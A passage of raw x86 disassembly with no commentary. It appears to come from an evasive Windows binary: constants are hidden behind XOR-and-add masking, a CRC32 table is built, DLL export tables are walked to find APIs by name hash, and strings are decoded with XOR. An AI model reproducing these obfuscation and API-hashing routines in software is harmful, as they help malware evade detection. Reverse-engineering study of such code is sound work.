  427db7:	pop    esi
  427db8:	leave  
  427db9:	ret    0x4
  427dbc:	push   ebp
  427dbd:	mov    ebp,esp
  427dbf:	sub    esp,0x21c
  427dc5:	mov    DWORD PTR [ebp-0x4],0xf89c85a5
  427dcc:	mov    DWORD PTR [ebp-0x14],0xf89c85ba
  427dd3:	mov    eax,DWORD PTR [ebp+0x10]
  427dd6:	mov    eax,DWORD PTR [ebp-0x4]
  427dd9:	mov    ecx,DWORD PTR [ebp+0x8]
  427ddc:	push   esi
  427ddd:	push   edi
  427dde:	mov    edi,0x75108aa
  427de3:	xor    eax,edi
  427de5:	mov    esi,0x3272f1
  427dea:	add    eax,esi
  427dec:	cmp    eax,ecx
  427dee:	mov    eax,DWORD PTR [ebp-0x4]
  427df1:	jne    0x427dfc
  427df3:	xor    eax,edi
  427df5:	add    eax,esi
  427df7:	jmp    0x427ea8
  427dfc:	mov    ecx,DWORD PTR [ebp+0xc]
  427dff:	xor    eax,edi
  427e01:	add    eax,esi
  427e03:	cmp    eax,ecx
  427e05:	jne    0x427e0c
  427e07:	mov    eax,DWORD PTR [ebp-0x4]
  427e0a:	jmp    0x427df3
  427e0c:	lea    eax,[ebp-0x21c]
  427e12:	mov    DWORD PTR [ebp-0x8],eax
  427e15:	mov    eax,DWORD PTR [ebp+0xc]
  427e18:	mov    DWORD PTR [ebp-0x10],eax
  427e1b:	mov    eax,DWORD PTR [ebp-0x4]
  427e1e:	xor    eax,edi
  427e20:	add    eax,esi
  427e22:	mov    DWORD PTR [ebp+0x10],eax
  427e25:	mov    eax,DWORD PTR [ebp+0xc]
  427e28:	push   ebx
  427e29:	call   0x427b53
  427e2e:	mov    ebx,eax
  427e30:	mov    eax,DWORD PTR [ebp+0x8]
  427e33:	mov    eax,DWORD PTR [eax+0x14]
  427e36:	jmp    0x427e90
  427e38:	mov    eax,DWORD PTR [ebp+0xc]
  427e3b:	sub    eax,0x8
  427e3e:	mov    DWORD PTR [ebp-0xc],eax
  427e41:	mov    eax,DWORD PTR [ebp-0xc]
  427e44:	mov    eax,DWORD PTR [eax+0x28]
  427e47:	call   0x427a3d
  427e4c:	mov    DWORD PTR [ebp+0x10],eax
  427e4f:	push   DWORD PTR [ebp+0x10]
  427e52:	mov    edx,DWORD PTR [ebp-0x8]
  427e55:	call   0x427be2
  427e5a:	mov    eax,DWORD PTR [ebp-0x4]
  427e5d:	xor    eax,edi
  427e5f:	add    eax,esi
  427e61:	cmp    eax,ebx
  427e63:	jne    0x427e6d
  427e65:	mov    eax,DWORD PTR [ebp-0x8]
  427e68:	call   0x427acb
  427e6d:	mov    eax,DWORD PTR [ebp-0x14]
  427e70:	xor    eax,edi
  427e72:	add    eax,esi
  427e74:	push   eax
  427e75:	push   DWORD PTR [ebp-0x10]
  427e78:	mov    eax,DWORD PTR [ebp-0x8]
  427e7b:	call   0x4277f7
  427e80:	mov    ecx,DWORD PTR [ebp-0x4]
  427e83:	xor    ecx,edi
  427e85:	add    ecx,esi
  427e87:	cmp    eax,ecx
  427e89:	je     0x427eae
  427e8b:	mov    eax,DWORD PTR [ebp+0xc]
  427e8e:	mov    eax,DWORD PTR [eax]
  427e90:	mov    DWORD PTR [ebp+0xc],eax
  427e93:	mov    eax,DWORD PTR [ebp+0x8]
  427e96:	mov    ecx,DWORD PTR [ebp+0xc]
  427e99:	add    eax,0x14
  427e9c:	cmp    ecx,eax
  427e9e:	jne    0x427e38
  427ea0:	mov    eax,DWORD PTR [ebp-0x4]
  427ea3:	xor    eax,edi
  427ea5:	add    eax,esi
  427ea7:	pop    ebx
  427ea8:	pop    edi
  427ea9:	pop    esi
  427eaa:	leave  
  427eab:	ret    0xc
  427eae:	mov    eax,DWORD PTR [ebp-0xc]
  427eb1:	mov    eax,DWORD PTR [eax+0x18]
  427eb4:	jmp    0x427ea7
  427eb6:	push   ebp
  427eb7:	mov    ebp,esp
  427eb9:	mov    eax,DWORD PTR [ebp+0xc]
  427ebc:	sub    esp,0x10
  427ebf:	cmp    DWORD PTR [ebp+0x8],0x0
  427ec3:	push   ebx
  427ec4:	push   esi
  427ec5:	push   edi
  427ec6:	je     0x427f7b
  427ecc:	test   eax,eax
  427ece:	je     0x427f7b
  427ed4:	movzx  eax,WORD PTR [eax+0x20]
  427ed8:	mov    ecx,eax
  427eda:	mov    DWORD PTR [ebp-0x10],eax
  427edd:	xor    edx,edx
  427edf:	and    DWORD PTR [ebp-0x8],edx
  427ee2:	mov    eax,0x8a98
  427ee7:	xor    ecx,eax
  427ee9:	add    ecx,0x3b5a
  427eef:	mov    DWORD PTR [ebp-0xc],ecx
  427ef2:	and    DWORD PTR [ebp-0x4],0x0
  427ef6:	xor    ecx,ecx
  427ef8:	push   0x7d
  427efa:	pop    edi
  427efb:	cmp    cx,WORD PTR [ebp-0xc]
  427eff:	jae    0x427f65
  427f01:	lea    esi,[edx-0x3b5a]
  427f07:	xor    esi,eax
  427f09:	movzx  ecx,WORD PTR [ebp-0x4]
  427f0d:	mov    ebx,DWORD PTR [ebp+0xc]
  427f10:	lea    ecx,[ebx+ecx*4]
  427f13:	cmp    WORD PTR [ecx+0x2],si
  427f17:	jne    0x427f50
  427f19:	movzx  ecx,WORD PTR [ecx]
  427f1c:	mov    edi,0x4e3e
  427f21:	cmp    cx,di
  427f24:	jne    0x427f32
  427f26:	mov    ebx,DWORD PTR [ebp+0x8]
  427f29:	movzx  edi,dx
  427f2c:	cmp    BYTE PTR [edi+ebx*1],0x0
  427f30:	je     0x427f5f
  427f32:	mov    ebx,DWORD PTR [ebp+0x8]
  427f35:	movzx  edi,dx
  427f38:	movsx  di,BYTE PTR [edi+ebx*1]
  427f3d:	mov    ebx,0x3b5a
  427f42:	sub    di,bx
  427f45:	xor    di,ax
  427f48:	cmp    cx,di
  427f4b:	je     0x427f5f
  427f4d:	push   0xffffff83
  427f4f:	pop    edi
  427f50:	inc    DWORD PTR [ebp-0x4]
  427f53:	mov    cx,WORD PTR [ebp-0xc]
  427f57:	cmp    WORD PTR [ebp-0x4],cx
  427f5b:	jb     0x427f09
  427f5d:	jmp    0x427f65
  427f5f:	inc    DWORD PTR [ebp-0x8]
  427f62:	push   0x7c
  427f64:	pop    edi
  427f65:	mov    esi,DWORD PTR [ebp+0x8]
  427f68:	movzx  ecx,dx
  427f6b:	cmp    BYTE PTR [ecx+esi*1],0x0
  427f6f:	je     0x427f84
  427f71:	inc    edx
  427f72:	cmp    edi,0xffffff83
  427f75:	jne    0x427ef2
  427f7b:	xor    eax,eax
  427f7d:	pop    edi
  427f7e:	pop    esi
  427f7f:	pop    ebx
  427f80:	leave  
  427f81:	ret    0x8
  427f84:	mov    ecx,DWORD PTR [ebp-0x8]
  427f87:	add    ecx,0xffffc4a6
  427f8d:	xor    cx,ax
  427f90:	xor    eax,eax
  427f92:	cmp    cx,WORD PTR [ebp-0x10]
  427f96:	sete   al
  427f99:	jmp    0x427f7d
  427f9b:	push   ebp
  427f9c:	mov    ebp,esp
  427f9e:	sub    esp,0x50
  427fa1:	push   edi
  427fa2:	mov    edi,eax
  427fa4:	mov    eax,DWORD PTR [edi+0x1a8]
  427faa:	cmp    DWORD PTR [eax],0x0
  427fad:	jne    0x427fb6
  427faf:	xor    eax,eax
  427fb1:	jmp    0x4280e7
  427fb6:	push   DWORD PTR [ebp+0x8]
  427fb9:	push   0x2c
  427fbb:	pop    eax
  427fbc:	call   0x427d4b
  427fc1:	mov    edx,DWORD PTR [edi+0x1ac]
  427fc7:	lea    eax,[edi+0x22]
  427fca:	mov    DWORD PTR [ebp-0x4c],eax
  427fcd:	lea    eax,[edi+0x44]
  427fd0:	mov    DWORD PTR [ebp-0x48],eax
  427fd3:	lea    eax,[edi+0x66]
  427fd6:	mov    DWORD PTR [ebp-0x44],eax
  427fd9:	lea    eax,[edi+0x88]
  427fdf:	mov    DWORD PTR [ebp-0x40],eax
  427fe2:	lea    eax,[edi+0xaa]
  427fe8:	mov    DWORD PTR [ebp-0x3c],eax
  427feb:	lea    eax,[edi+0xcc]
  427ff1:	mov    DWORD PTR [ebp-0x38],eax
  427ff4:	lea    eax,[edi+0xee]
  427ffa:	mov    DWORD PTR [ebp-0x34],eax
  427ffd:	lea    eax,[edi+0x110]
  428003:	mov    DWORD PTR [ebp-0x30],eax
  428006:	lea    eax,[edi+0x132]
  42800c:	mov    DWORD PTR [ebp-0x2c],eax
  42800f:	lea    eax,[edi+0x154]
  428015:	push   edi
  428016:	mov    DWORD PTR [ebp-0x50],edi
  428019:	mov    DWORD PTR [ebp-0x28],eax
  42801c:	call   0x42811b
  428021:	push   eax
  428022:	mov    eax,DWORD PTR [edi+0x1a8]
  428028:	push   DWORD PTR [eax]
  42802a:	call   0x427dbc
  42802f:	mov    DWORD PTR [ebp-0x10],eax
  428032:	test   eax,eax
  428034:	je     0x4280e7
  42803a:	mov    ecx,DWORD PTR [eax+0x3c]
  42803d:	push   ebx
  42803e:	push   esi
  42803f:	mov    esi,DWORD PTR [ecx+eax*1+0x78]
  428043:	add    esi,eax
  428045:	mov    edi,DWORD PTR [esi+0x24]
  428048:	mov    ecx,DWORD PTR [esi+0x1c]
  42804b:	mov    edx,DWORD PTR [esi+0x20]
  42804e:	mov    ebx,DWORD PTR [esi+0x18]
  428051:	add    edi,eax
  428053:	mov    DWORD PTR [ebp-0x20],edi
  428056:	mov    edi,DWORD PTR [esi+0x14]
  428059:	add    ecx,eax
  42805b:	add    edx,eax
  42805d:	mov    DWORD PTR [ebp-0xc],ecx
  428060:	mov    DWORD PTR [ebp-0x1c],edx
  428063:	mov    DWORD PTR [ebp-0x8],edi
  428066:	cmp    edi,ebx
  428068:	ja     0x42806d
  42806a:	mov    DWORD PTR [ebp-0x8],ebx
  42806d:	xor    ebx,ebx
  42806f:	mov    DWORD PTR [ebp-0x18],ebx
  428072:	cmp    DWORD PTR [ebp-0x8],ebx
  428075:	jbe    0x4280e5
  428077:	jmp    0x42807c
  428079:	mov    edx,DWORD PTR [ebp-0x1c]
  42807c:	mov    edi,DWORD PTR [ebp-0x20]
  42807f:	movzx  edi,WORD PTR [edi+ebx*2]
  428083:	cmp    ebx,DWORD PTR [esi+0x18]
  428086:	jae    0x4280e5
  428088:	cmp    edi,DWORD PTR [esi+0x14]
  42808b:	jae    0x4280e5
  42808d:	mov    ebx,DWORD PTR [edx+ebx*4]
  428090:	mov    edx,DWORD PTR [ebp+0x8]
  428093:	mov    edi,DWORD PTR [ecx+edi*4]
  428096:	mov    DWORD PTR [ebp-0x4],edx
  428099:	lea    edx,[ebp-0x50]
  42809c:	add    ebx,eax
  42809e:	add    edi,eax
  4280a0:	sub    edx,DWORD PTR [ebp+0x8]
  4280a3:	mov    DWORD PTR [ebp-0x14],0xb
  4280aa:	mov    DWORD PTR [ebp-0x24],edx
  4280ad:	mov    edx,DWORD PTR [ebp-0x4]
  4280b0:	cmp    DWORD PTR [edx],0x0
  4280b3:	jne    0x4280d0
  4280b5:	mov    eax,DWORD PTR [ebp-0x24]
  4280b8:	push   DWORD PTR [eax+edx*1]
  4280bb:	push   ebx
  4280bc:	call   0x427eb6
  4280c1:	mov    ecx,DWORD PTR [ebp-0xc]
  4280c4:	test   eax,eax
  4280c6:	je     0x4280cd
  4280c8:	mov    eax,DWORD PTR [ebp-0x4]
  4280cb:	mov    DWORD PTR [eax],edi
  4280cd:	mov    eax,DWORD PTR [ebp-0x10]
  4280d0:	add    DWORD PTR [ebp-0x4],0x4
  4280d4:	dec    DWORD PTR [ebp-0x14]
  4280d7:	jne    0x4280ad
  4280d9:	mov    ebx,DWORD PTR [ebp-0x18]
  4280dc:	inc    ebx
  4280dd:	mov    DWORD PTR [ebp-0x18],ebx
  4280e0:	cmp    ebx,DWORD PTR [ebp-0x8]
  4280e3:	jb     0x428079
  4280e5:	pop    esi
  4280e6:	pop    ebx
  4280e7:	pop    edi
  4280e8:	leave  
  4280e9:	ret    0x4
  4280ec:	push   ebp
  4280ed:	mov    ebp,esp
  4280ef:	mov    eax,DWORD PTR [ebp+0x8]
  4280f2:	push   esi
  4280f3:	push   DWORD PTR [eax+0x1e0]
  4280f9:	lea    esi,[eax+0x198]
  4280ff:	mov    eax,DWORD PTR [ebp+0x8]
  428102:	call   0x427f9b
  428107:	mov    ecx,DWORD PTR [esi]
  428109:	mov    DWORD PTR [ecx],eax
  42810b:	mov    eax,DWORD PTR [esi]
  42810d:	xor    ecx,ecx
  42810f:	cmp    DWORD PTR [eax],ecx
  428111:	pop    esi
  428112:	setne  cl
  428115:	mov    eax,ecx
  428117:	pop    ebp
  428118:	ret    0x4
  42811b:	mov    ecx,DWORD PTR [edi+0x188]
  428121:	push   ebx
  428122:	jmp    0x428137
  428124:	xor    eax,0x8a98
  428129:	add    eax,0x3b5a
  42812e:	mov    WORD PTR [ecx],ax
  428131:	add    ecx,0x2
  428134:	add    edx,0x2
  428137:	movzx  eax,WORD PTR [edx]
  42813a:	mov    ebx,0x4e3e
  42813f:	cmp    ax,bx
  428142:	jne    0x428124
  428144:	xor    eax,eax
  428146:	mov    WORD PTR [ecx],ax
  428149:	mov    eax,DWORD PTR [edi+0x188]
  42814f:	pop    ebx
  428150:	ret    
  428151:	push   edi
  428152:	mov    edi,eax
  428154:	mov    eax,DWORD PTR [esi+0x188]
  42815a:	shl    edi,0x6
  42815d:	add    eax,edi
  42815f:	jmp    0x42816a
  428161:	xor    cl,0x7c
  428164:	inc    cl
  428166:	mov    BYTE PTR [eax],cl
  428168:	inc    eax
  428169:	inc    edx
  42816a:	mov    cl,BYTE PTR [edx]
  42816c:	cmp    cl,0x83
  42816f:	jne    0x428161
  428171:	mov    BYTE PTR [eax],0x0
  428174:	mov    eax,DWORD PTR [esi+0x188]
  42817a:	add    eax,edi
  42817c:	pop    edi
  42817d:	ret    
  42817e:	push   ebp
  42817f:	mov    ebp,esp
  428181:	sub    esp,0x14
  428184:	mov    DWORD PTR [ebp-0x10],0xf89c85a5
  42818b:	mov    DWORD PTR [ebp-0x4],0xf89c85ba
  428192:	mov    eax,DWORD PTR [ebx]
  428194:	mov    DWORD PTR [ebp-0x8],eax
  428197:	mov    DWORD PTR [ebp-0xc],0xf89c85bd
  42819e:	push   esi
  42819f:	push   edi
  4281a0:	mov    DWORD PTR [ebp-0x14],0xead71885
  4281a7:	mov    edi,DWORD PTR [ebp-0x4]
  4281aa:	mov    ecx,DWORD PTR [ebp-0x10]
  4281ad:	mov    eax,0x75108aa
  4281b2:	xor    edi,eax
  4281b4:	mov    edx,0x3272f1
  4281b9:	xor    ecx,eax
  4281bb:	add    edi,edx
  4281bd:	add    ecx,edx
  4281bf:	imul   edi,ecx
  4281c2:	jmp    0x42820a
  4281c4:	mov    ecx,DWORD PTR [ebp-0x8]
  4281c7:	mov    esi,DWORD PTR [ebp-0x4]
  4281ca:	xor    ecx,eax
  4281cc:	xor    esi,eax
  4281ce:	add    ecx,edx
  4281d0:	add    esi,edx
  4281d2:	test   esi,ecx
  4281d4:	mov    esi,DWORD PTR [ebp-0x8]
  4281d7:	mov    ecx,DWORD PTR [ebp-0x4]
  4281da:	je     0x4281f1
  4281dc:	xor    ecx,eax
  4281de:	xor    esi,eax
  4281e0:	add    ecx,edx
  4281e2:	add    esi,edx
  4281e4:	shr    esi,cl
  4281e6:	mov    ecx,DWORD PTR [ebp-0x14]
  4281e9:	xor    ecx,eax
  4281eb:	add    ecx,edx
  4281ed:	xor    esi,ecx
  4281ef:	jmp    0x4281fb
  4281f1:	xor    esi,eax
  4281f3:	xor    ecx,eax
  4281f5:	add    esi,edx
  4281f7:	add    ecx,edx
  4281f9:	shr    esi,cl
  4281fb:	mov    DWORD PTR [ebp-0x8],esi
  4281fe:	mov    ecx,DWORD PTR [ebp-0x4]
  428201:	xor    ecx,eax
  428203:	lea    edi,[edi+ecx*1+0x3272f1]
  42820a:	mov    ecx,DWORD PTR [ebp-0xc]
  42820d:	mov    esi,DWORD PTR [ebp-0x4]
  428210:	xor    esi,eax
  428212:	xor    ecx,eax
  428214:	sub    ecx,esi
  428216:	cmp    edi,ecx
  428218:	jbe    0x4281c4
  42821a:	mov    eax,DWORD PTR [ebp-0x8]
  42821d:	pop    edi
  42821e:	mov    DWORD PTR [ebx],eax
  428220:	mov    eax,DWORD PTR [ebp-0x8]
  428223:	pop    esi
  428224:	leave  
  428225:	ret    
  428226:	push   ebp
  428227:	mov    ebp,esp
  428229:	sub    esp,0x38
  42822c:	push   ebx
  42822d:	mov    ebx,0xf89c85a5
  428232:	mov    DWORD PTR [ebp-0x4],ebx
  428235:	lea    ecx,[ebx+0x15]
  428238:	mov    DWORD PTR [ebp-0x24],ecx
  42823b:	mov    eax,DWORD PTR [ebp-0x4]
  42823e:	mov    edx,DWORD PTR [ebp+0x8]
  428241:	push   esi
  428242:	mov    esi,0x75108aa
  428247:	xor    eax,esi
  428249:	push   edi
  42824a:	mov    edi,0x3272f1
  42824f:	add    eax,edi
  428251:	cmp    edx,eax
  428253:	mov    eax,DWORD PTR [ebp-0x4]
  428256:	je     0x4283ba
  42825c:	mov    edx,DWORD PTR [ebp+0xc]
  42825f:	xor    eax,esi
  428261:	add    eax,edi
  428263:	cmp    edx,eax
  428265:	je     0x4283b7
  42826b:	mov    eax,DWORD PTR [ebp+0x10]
  42826e:	mov    edx,DWORD PTR [ebp+0xc]
  428271:	mov    DWORD PTR [ebp-0x14],eax
  428274:	mov    eax,DWORD PTR [ebp+0x8]
  428277:	mov    DWORD PTR [ebp-0x18],0xf89c853f
  42827e:	mov    DWORD PTR [ebp-0xc],eax
  428281:	lea    eax,[ebx+0x16]
  428284:	mov    DWORD PTR [ebp-0x1c],eax
  428287:	mov    DWORD PTR [ebp-0x10],ebx
  42828a:	mov    DWORD PTR [ebp+0xc],ecx
  42828d:	mov    DWORD PTR [ebp+0x10],eax
  428290:	mov    eax,DWORD PTR [ebp+0xc]
  428293:	xor    eax,esi
  428295:	mov    DWORD PTR [ebp-0x20],edx
  428298:	sub    edx,eax
  42829a:	sub    edx,edi
  42829c:	mov    DWORD PTR [ebp+0x8],edx
  42829f:	mov    DWORD PTR [ebp-0x8],0xf89c85be
  4282a6:	jmp    0x4283a7
  4282ab:	mov    eax,DWORD PTR [ebp+0xc]
  4282ae:	mov    ecx,DWORD PTR [ebp+0xc]
  4282b1:	xor    eax,esi
  4282b3:	xor    ecx,esi
  4282b5:	lea    ecx,[eax+ecx*1+0x64e5e2]
  4282bc:	mov    eax,DWORD PTR [ebp+0x8]
  4282bf:	xor    edx,edx
  4282c1:	div    ecx
  4282c3:	mov    eax,DWORD PTR [ebp+0x10]
  4282c6:	mov    ecx,DWORD PTR [ebp+0xc]
  4282c9:	xor    eax,esi
  4282cb:	xor    ecx,esi
  4282cd:	sub    eax,ecx
  4282cf:	cmp    edx,eax
  4282d1:	jne    0x428366
  4282d7:	mov    eax,DWORD PTR [ebp+0x8]
  4282da:	mov    ecx,DWORD PTR [ebp-0xc]
  4282dd:	mov    dl,BYTE PTR [eax+ecx*1]
  4282e0:	mov    eax,DWORD PTR [ebp-0x10]
  4282e3:	mov    ecx,DWORD PTR [ebp-0x8]
  4282e6:	xor    eax,esi
  4282e8:	xor    ecx,esi
  4282ea:	add    eax,edi
  4282ec:	add    ecx,edi
  4282ee:	cmp    eax,ecx
  4282f0:	jae    0x428338
  4282f2:	lea    ecx,[eax-0x3272f1]
  4282f8:	mov    DWORD PTR [ebp-0x4],ecx
  4282fb:	mov    ebx,DWORD PTR [ebp-0x4]
  4282fe:	xor    ebx,esi
  428300:	add    ebx,0x7f55d8fb
  428306:	lea    ecx,[ebp+eax*4-0x38]
  42830a:	mov    DWORD PTR [ecx],ebx
  42830c:	mov    ebx,DWORD PTR [ecx]
  42830e:	cmp    ebx,0x244ecb98
  428314:	jbe    0x42831e
  428316:	add    DWORD PTR [ecx],0x405fcd9
  42831c:	jmp    0x428324
  42831e:	add    DWORD PTR [ecx],0xfdaf4327
  428324:	mov    ecx,DWORD PTR [ebp-0x8]
  428327:	xor    ecx,esi
  428329:	inc    eax
  42832a:	inc    DWORD PTR [ebp-0x4]
  42832d:	add    ecx,edi
  42832f:	cmp    eax,ecx
  428331:	jb     0x4282fb
  428333:	mov    ebx,0xf89c85a5
  428338:	cmp    DWORD PTR [ebp-0x14],0x0
  42833c:	jne    0x428345
  42833e:	xor    dl,0x7c
  428341:	inc    dl
  428343:	jmp    0x42835b
  428345:	mov    eax,DWORD PTR [ebp-0x18]
  428348:	xor    al,0xaa
  42834a:	mov    cl,0xf
  42834c:	sub    cl,al
  42834e:	add    dl,cl
  428350:	mov    ecx,DWORD PTR [ebp-0x1c]
  428353:	xor    cl,0xaa
  428356:	sub    cl,0xf
  428359:	ror    dl,cl
  42835b:	xor    eax,eax
  42835d:	mov    eax,DWORD PTR [ebp+0x8]
  428360:	mov    ecx,DWORD PTR [ebp-0xc]
  428363:	mov    BYTE PTR [eax+ecx*1],dl
  428366:	mov    eax,DWORD PTR [ebp+0x8]
  428369:	mov    ecx,DWORD PTR [ebp-0x10]
  42836c:	sub    eax,edi
  42836e:	xor    eax,esi
  428370:	cmp    eax,ecx
  428372:	jne    0x428395
  428374:	mov    eax,DWORD PTR [ebp+0x10]
  428377:	mov    ecx,DWORD PTR [ebp+0xc]
  42837a:	xor    eax,esi
  42837c:	xor    ecx,esi
  42837e:	sub    eax,ecx
  428380:	mov    ecx,DWORD PTR [ebp-0x20]
  428383:	sub    eax,edi
  428385:	xor    eax,esi
  428387:	mov    DWORD PTR [ebp+0x10],eax
  42838a:	mov    eax,DWORD PTR [ebp+0xc]
  42838d:	xor    eax,esi
  42838f:	sub    ecx,eax
  428391:	sub    ecx,edi
  428393:	jmp    0x4283a4
  428395:	mov    eax,DWORD PTR [ebp+0xc]
  428398:	xor    eax,esi
  42839a:	mov    ecx,0xffcd8d0f
  42839f:	sub    ecx,eax
  4283a1:	add    ecx,DWORD PTR [ebp+0x8]
  4283a4:	mov    DWORD PTR [ebp+0x8],ecx
  4283a7:	mov    eax,DWORD PTR [ebp+0x10]
  4283aa:	cmp    eax,ebx
  4283ac:	jne    0x4282ab
  4283b2:	mov    eax,DWORD PTR [ebp-0x24]
  4283b5:	jmp    0x4283ba
  4283b7:	mov    eax,DWORD PTR [ebp-0x4]
  4283ba:	xor    eax,esi
  4283bc:	add    eax,edi
  4283be:	pop    edi
  4283bf:	pop    esi
  4283c0:	pop    ebx
  4283c1:	leave  
  4283c2:	ret    0xc
  4283c5:	push   ebp
  4283c6:	mov    ebp,esp
  4283c8:	sub    esp,0x420
  4283ce:	mov    DWORD PTR [ebp-0x14],0xf89c85a5
  4283d5:	mov    DWORD PTR [ebp-0xc],0xf89c85ba
  4283dc:	mov    DWORD PTR [ebp-0x18],0xf89c86a5
  4283e3:	push   ebx
  4283e4:	mov    DWORD PTR [ebp-0x1c],0xf89c85a4
  4283eb:	mov    eax,DWORD PTR [ebp-0x14]
  4283ee:	push   esi
  4283ef:	mov    esi,0x75108aa
  4283f4:	push   edi
  4283f5:	xor    eax,esi
  4283f7:	mov    edi,0x3272f1
  4283fc:	add    eax,edi
  4283fe:	mov    DWORD PTR [ebp-0x8],eax
  428401:	mov    DWORD PTR [ebp-0x20],0xf89c85bd
  428408:	mov    DWORD PTR [ebp-0x4],0xead71885
  42840f:	mov    DWORD PTR [ebp-0x10],0x8
  428416:	mov    ecx,ecx
  428418:	mov    eax,DWORD PTR [ebp-0xc]
  42841b:	mov    ecx,DWORD PTR [ebp-0x14]
  42841e:	xor    eax,esi
  428420:	xor    ecx,esi
  428422:	add    eax,edi
  428424:	add    ecx,edi
  428426:	imul   eax,ecx
  428429:	jmp    0x42845c
  42842b:	mov    eax,DWORD PTR [ebp-0x4]
  42842e:	sub    eax,edi
  428430:	xor    eax,esi
  428432:	mov    DWORD PTR [ebp-0x8],eax
  428435:	lea    ebx,[ebp-0x8]
  428438:	call   0x42817e
  42843d:	mov    DWORD PTR [ebp-0x8],eax
  428440:	mov    eax,DWORD PTR [ebp-0x8]
  428443:	mov    ecx,DWORD PTR [ebp-0x4]
  428446:	mov    DWORD PTR [ebp+ecx*4-0x420],eax
  42844d:	mov    eax,DWORD PTR [ebp-0xc]
  428450:	mov    ecx,DWORD PTR [ebp-0x4]
  428453:	xor    eax,esi
  428455:	lea    eax,[eax+ecx*1+0x3272f1]
  42845c:	mov    DWORD PTR [ebp-0x4],eax
  42845f:	mov    eax,DWORD PTR [ebp-0x18]
  428462:	mov    ecx,DWORD PTR [ebp-0xc]
  428465:	xor    ecx,esi
  428467:	xor    eax,esi
  428469:	sub    eax,ecx
  42846b:	mov    ecx,DWORD PTR [ebp-0x4]
  42846e:	cmp    ecx,eax
  428470:	jbe    0x42842b
  428472:	mov    eax,DWORD PTR [ebp-0x1c]
  428475:	xor    eax,esi
  428477:	add    eax,edi
  428479:	mov    DWORD PTR [ebp-0x8],eax
  42847c:	mov    DWORD PTR [ebp-0x18],0xf89c86a4
  428483:	mov    ebx,ebx
  428485:	jmp    0x4284e8
  428487:	mov    ecx,DWORD PTR [ebp-0x20]
  42848a:	mov    eax,DWORD PTR [ebp-0x8]
  42848d:	xor    ecx,esi
  42848f:	add    ecx,edi
  428491:	shr    eax,cl
  428493:	mov    DWORD PTR [ebp-0x4],eax
  428496:	mov    eax,DWORD PTR [ebp+0x8]
  428499:	mov    cl,BYTE PTR [eax]
  42849b:	mov    BYTE PTR [ebp+0xb],cl
  42849e:	mov    cl,BYTE PTR [ebp+0xb]
  4284a1:	mov    edx,DWORD PTR [ebp-0x8]
  4284a4:	movzx  ecx,cl
  4284a7:	xor    ecx,edx
  4284a9:	mov    DWORD PTR [ebp+0x8],ecx
  4284ac:	mov    ecx,DWORD PTR [ebp-0x18]
  4284af:	mov    edx,DWORD PTR [ebp+0x8]
  4284b2:	xor    ecx,esi
  4284b4:	add    ecx,edi
  4284b6:	and    ecx,edx
  4284b8:	mov    ecx,DWORD PTR [ebp+ecx*4-0x420]
  4284bf:	mov    edx,DWORD PTR [ebp-0x4]
  4284c2:	xor    ecx,edx
  4284c4:	mov    DWORD PTR [ebp-0x8],ecx
  4284c7:	mov    ecx,DWORD PTR [ebp-0xc]
  4284ca:	xor    ecx,esi
  4284cc:	lea    eax,[eax+ecx*1+0x3272f1]
  4284d3:	mov    DWORD PTR [ebp+0x8],eax
  4284d6:	mov    eax,DWORD PTR [ebp-0xc]
  4284d9:	xor    eax,esi
  4284db:	mov    ecx,0xffcd8d0f
  4284e0:	sub    ecx,eax
  4284e2:	add    ecx,DWORD PTR [ebp-0x10]
  4284e5:	mov    DWORD PTR [ebp-0x10],ecx
  4284e8:	mov    eax,DWORD PTR [ebp-0x14]
  4284eb:	mov    ecx,DWORD PTR [ebp-0x10]
  4284ee:	xor    eax,esi
  4284f0:	add    eax,edi
  4284f2:	cmp    ecx,eax
  4284f4:	jne    0x428487
  4284f6:	mov    eax,DWORD PTR [ebp-0x1c]
  4284f9:	mov    ecx,DWORD PTR [ebp-0x8]
  4284fc:	xor    eax,esi
  4284fe:	add    eax,edi
  428500:	pop    edi
  428501:	pop    esi
  428502:	xor    eax,ecx
  428504:	pop    ebx
  428505:	leave  
  428506:	ret    0x4
  428509:	push   ebp
  42850a:	mov    ebp,esp
  42850c:	mov    eax,DWORD PTR [ebp+0x1c]
  42850f:	mov    ecx,DWORD PTR [ebp+0x8]
  428512:	mov    edx,DWORD PTR [ebp+0x10]
  428515:	mov    eax,DWORD PTR [eax+0x190]
  42851b:	mov    eax,DWORD PTR [eax]
  42851d:	sub    esp,0x64
  428520:	push   ebx
  428521:	push   esi
  428522:	push   edi
  428523:	mov    edi,0x75108aa
  428528:	xor    ecx,edi
  42852a:	mov    ebx,0x3272f1
  42852f:	add    ecx,ebx
  428531:	cmp    ecx,edx
  428533:	jne    0x428544
  428535:	or     DWORD PTR ds:0x3750c3f,0x4263eb2c
  42853f:	jmp    0x428a40
  428544:	mov    ecx,DWORD PTR [ebp+0x8]
  428547:	mov    esi,DWORD PTR [ebp+0x14]
  42854a:	mov    edx,DWORD PTR [esi]
  42854c:	xor    ecx,edi
  42854e:	add    ecx,ebx
  428550:	cmp    edx,ecx
  428552:	je     0x4289fb
  428558:	mov    ecx,DWORD PTR [ebp+0x1c]
  42855b:	mov    DWORD PTR [ebp-0x1c],eax
  42855e:	mov    DWORD PTR [ebp+0x1c],ecx
  428561:	mov    ecx,DWORD PTR [ebp+0x18]
  428564:	mov    eax,DWORD PTR [esi]
  428566:	mov    DWORD PTR [ebp-0x20],eax
  428569:	mov    DWORD PTR [ebp+0x8],0xf89c85a5
  428570:	mov    edx,0xf89c85ba
  428575:	mov    DWORD PTR [ebp-0x8],edx
  428578:	mov    eax,DWORD PTR [ebp+0x1c]
  42857b:	mov    DWORD PTR [ebp+0x1c],eax
  42857e:	mov    eax,DWORD PTR [ebp+0x1c]
  428581:	mov    eax,DWORD PTR [eax+0x190]
  428587:	mov    eax,DWORD PTR [eax]
  428589:	mov    DWORD PTR [ebp-0x24],ecx
  42858c:	mov    ecx,DWORD PTR [ebp+0x1c]
  42858f:	mov    ecx,DWORD PTR [ecx+0x190]
  428595:	mov    ecx,DWORD PTR [ecx]
  428597:	add    ecx,DWORD PTR [eax+0x3c]
  42859a:	mov    DWORD PTR [ebp+0x10],ecx
  42859d:	mov    eax,DWORD PTR [ebp+0x8]
  4285a0:	xor    eax,edi
  4285a2:	add    eax,ebx
  4285a4:	mov    DWORD PTR [ebp-0x4],eax
  4285a7:	mov    eax,DWORD PTR [ebp+0x8]
  4285aa:	xor    eax,edi
  4285ac:	add    eax,ebx
  4285ae:	mov    DWORD PTR [ebp+0x18],eax
  4285b1:	mov    eax,DWORD PTR [ebp+0x10]
  4285b4:	mov    eax,DWORD PTR [eax+0x50]
